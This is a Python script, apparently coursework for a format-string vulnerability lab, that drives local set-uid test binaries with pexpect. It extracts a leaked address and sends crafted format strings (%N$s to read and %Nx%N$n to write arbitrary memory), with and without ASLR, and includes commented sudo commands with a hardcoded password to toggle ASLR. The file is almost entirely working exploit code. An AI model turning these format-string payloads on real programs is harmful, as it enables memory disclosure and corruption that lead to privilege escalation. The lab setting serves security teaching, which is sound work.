import pexpect, os, sys, tty

FILENAME = ""

# Spawn piped process of updated formatstring program
def spawnProcess(FILE):
    print "Spawning process " + FILE + ". See log file for terminal output."
    p = pexpect.spawn(FILE)
    p.logfile = open("log", "w")
    return p
    
def extractAddress(p):
    # Extract string of target address
    p.expect_exact(["secret[1]'s address is "])
    address = p.readline()[2:10]
    address = address.replace(" ", "0")
    print "Target Address:" + address
    return address
    
def writeHexFile(p, address):
    # Construct target address string
    s = address[6:8]
    s = s + " "+address[4:6]
    s = s + " "+address[2:4]
    s = s + " "+address[0:2]

    # Write target address string then convert to hex
    fwrite = open('file.hex', 'w')
    fwrite.write(s)
    fwrite.close()
    #pexpect.run('xxd -p -r file.hex > file')
    pexpect.run("hexDump.sh")

def readHexFile():
    # Read hex data
    fread = open('file')
    data = fread.read()
    fread.close()
    return data
    
def checkAddress(address):
    addr = [address[0:2], address[2:4], address[4:6], address[6:8]]
    invalids = ["00", "0C", "0A", "0D", "09", "20"]
    if any(elem in addr for elem in invalids):
        print "Certain control characters (00, 0C, 0A, 0D, 09, 08, etc) can be invalid. Retrying."
        return False
    else:
        return True

def readFromAddress(p, address, data):
    # Set file descriptor to take raw input (allows command hex codes)
    tty.setraw(p.fileno())

    pos = 10
    index = 6
    stringInput = data+"%"+str(pos)+"$s"
    res = p.expect_exact(["Please enter a decimal integer", pexpect.EOF, pexpect.TIMEOUT], 0.1)
    if (res == 0):
        print "Address from input integer. Using stack position to 9."
        pos = 9;
        intInput = str(int(address,16))
        p.sendline(intInput)
        stringInput = "%"+str(pos)+"$s"
        index = 1;
    else:
        print "Address from input string. Using stack position to 10."

    e = p.expect_exact("Please enter a string")
    p.sendline(stringInput)

    # Output remaining
    output = p.read()
    print output
    
    p.close()

    if checkAddress(address):
        secret = output[index]
        print "secret[1] is: " + secret
        print "In hex: 0x" + secret.encode("hex_codec")
        return True
    else:
        return False
    
def writeToAddress(p, address, data, writeData):
    # Set file descriptor to take raw input (allows command hex codes)
    tty.setraw(p.fileno())

    pos = 10
    stringInput = ""
    res = p.expect_exact(["Please enter a decimal integer", pexpect.EOF, pexpect.TIMEOUT], 0.1)
    if (res == 0):
        print "Address from input integer. Using stack position to 9."
        pos = 9;
        intInput = str(int(address,16))
        p.sendline(intInput)
    else:
        print "Address from input string. Using stack position to 10."
        writeData = writeData - 4;
        stringInput = data;

    if (writeData < 8):
        for i in range(writeData):
            stringInput = stringInput+"A"
    else:
        stringInput = stringInput+"%"+str(writeData)+"x"
                    
    stringInput = stringInput+"%"+str(pos)+"$n"

    e = p.expect_exact("Please enter a string")
    p.sendline(stringInput)

    # Output remaining
    output = p.read()
    print output
    p.close()
    
    if checkAddress(address):
        return True
    else:
        return False
    
    
    

def readSecret(FILE):
    p = spawnProcess(FILE)
    address = extractAddress(p)
    writeHexFile(p, address)
    data = readHexFile()
    if readFromAddress(p, address, data) == False:
        readSecret(FILE)

def writeSecret(FILE, writeData):
    p = spawnProcess(FILE)
    address = extractAddress(p)
    writeHexFile(p, address)
    data = readHexFile()
    if writeToAddress(p, address, data, writeData) == False:
        writeSecret(FILE, writeData)
     
###
FILENAME = "./formatstr-root"

#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
#print "[ASLR On]: "+aslr

print "[TASK 1b]: Reading from address using previous input"
raw_input("Press Enter to continue...")
readSecret(FILENAME)
print "[TASK 1c & d]: Writing to address using previous input"
raw_input("Press Enter to continue...")
writeSecret(FILENAME, 400)

###
FILENAME = "./formatstr-root2"

#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=0")
#print "[ASLR OFF]: "+aslr

print "[TASK 2b]: Reading from address using input string without ASLR"
raw_input("Press Enter to continue...")
readSecret(FILENAME)
print "[TASK 2c & 2d]: Writing to address using input string without ASLR"
raw_input("Press Enter to continue...")
writeSecret(FILENAME, 400)

###
#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
#print "[ASLR On]: "+aslr

print "[TASK 3b]: Reading from address using input string with ASLR"
raw_input("Press Enter to continue...")
readSecret(FILENAME)
print "[TASK 3c & 3d]: Writing to address using input string with ASLR"
raw_input("Press Enter to continue...")
writeSecret(FILENAME, 400)
